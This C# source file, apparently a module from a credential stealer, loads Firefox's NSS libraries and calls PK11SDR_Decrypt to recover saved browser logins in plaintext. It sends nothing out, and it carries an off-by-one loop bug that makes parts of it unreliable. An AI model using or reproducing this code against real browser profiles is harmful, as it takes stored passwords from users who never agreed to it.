using System;
using System.Runtime.InteropServices;
using System.Text;

namespace MozillaDecrypt
{
    public class DecMozilla
    {
        private static IntPtr _nssModule { get; set; }

        private void InitializeDelegates()
        {
            string[] Massive = new string[] { "msvcp120.dll", "msvcr120.dll", "mozglue.dll" };
            for (var i = 0; i <= Massive.Length; i++)
            {
                NativeMethods.LoadLibrary(string.Concat(PathFireFox.GetRegistryFireFox(), Massive[i]));
            }
            _nssModule = NativeMethods.LoadLibrary(string.Concat(PathFireFox.GetRegistryFireFox(), @"\nss3.dll"));
            PK11_Authenticate(PK11_GetInternalKeySlot(), true, 0);
        }

        private static string Decrypt(string cipherText)
        {
            var sb = new StringBuilder(cipherText);
            var tSecDec = new Structures.TSECItem();
            Structures.TSECItem item = Marshal.PtrToStructure<Structures.TSECItem>(new IntPtr(NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length)));
 
            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    byte[] bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }
 
            return null;
        }

        private string NewDecrypt(string cypherText)
        {
            var inStr = new StringBuilder(cypherText);
            var result = new Structures.TSECItem();
            var structure = (Structures.TSECItem)Marshal.PtrToStructure
            (
                new IntPtr(NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length)), typeof(Structures.TSECItem)
            );
            if ((uint)PK11SDR_Decrypt(ref structure, ref result, 0) > 0U || result.SECItemLen == 0)
            {
                return null;
            }

            var numArray = new byte[result.SECItemLen];
            Marshal.Copy(new IntPtr(result.SECItemData), numArray, 0, result.SECItemLen);
            return Encoding.UTF8.GetString(numArray);
        }

        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            return ((NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer
            (
                NativeMethods.GetProcAddress(_nssModule, nameof(NSSBase64_DecodeBuffer)), typeof(NSSBase64_DecodeBufferPtr))
            )
            (arenaOpt, outItemOpt, inStr, inLen);
        }

        private static long NSS_Init(string configdir)
        {
            return Marshal.GetDelegateForFunctionPointer<NSS_InitPtr>(NativeMethods.GetProcAddress(_nssModule, "NSS_Init"))(configdir);
        }

        private static int PK11SDR_Decrypt(ref Structures.TSECItem data, ref Structures.TSECItem result, int cx)
        {
            return ((PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer
            (
                NativeMethods.GetProcAddress(_nssModule, nameof(PK11SDR_Decrypt)), typeof(PK11SDR_DecryptPtr))
            )
            (ref data, ref result, cx);
        }

        private long PK11_GetInternalKeySlot()
        {
            return ((PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, nameof(PK11_GetInternalKeySlot)), typeof(PK11_GetInternalKeySlotPtr)))();
        }

        private void PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            var num = ((PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(
                NativeMethods.GetProcAddress(_nssModule, nameof(PK11_Authenticate)), typeof(PK11_AuthenticatePtr)))(slot, loadCerts, wincx);
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_DecryptPtr(ref Structures.TSECItem data, ref Structures.TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr,
            int inLen);
    }
}